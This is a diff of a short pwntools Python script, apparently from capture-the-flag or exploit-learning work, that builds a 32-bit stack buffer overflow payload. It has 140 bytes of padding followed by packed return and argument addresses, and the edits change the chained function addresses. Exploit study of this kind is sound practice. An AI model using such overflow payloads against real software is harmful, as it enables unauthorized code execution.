@@ -39,14 +39,14 @@ $3 = 0xaf8f0
 from pwn import *
 payload = ''.join([
     140 * 'A',          #
-    # p32(0x80483a0),
-    p32(0xdeadbeef),
+    p32(0x80483a0),
+    # p32(0xdeadbeef),
     # -----------------
-    p32(0x080484d4),     # vulnerable_function
+    p32(0x08048474),     # vulnerable_function
     # 'CCCC' ,
     # -----------------
     p32(0x1),
-    p32(0x08048360),
+    p32(0x0804a000),
     p32(0x4),
 ])
 print(payload)
